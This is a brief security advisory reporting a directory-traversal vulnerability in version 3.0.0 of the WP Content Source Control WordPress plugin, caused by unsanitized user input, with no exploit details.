WP Content Source Control plugin for WordPress is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue can allow an attacker to obtain sensitive information that could aid in further attacks.

WP Content Source Control 3.0.0 is vulnerable; other versions may also be affected.
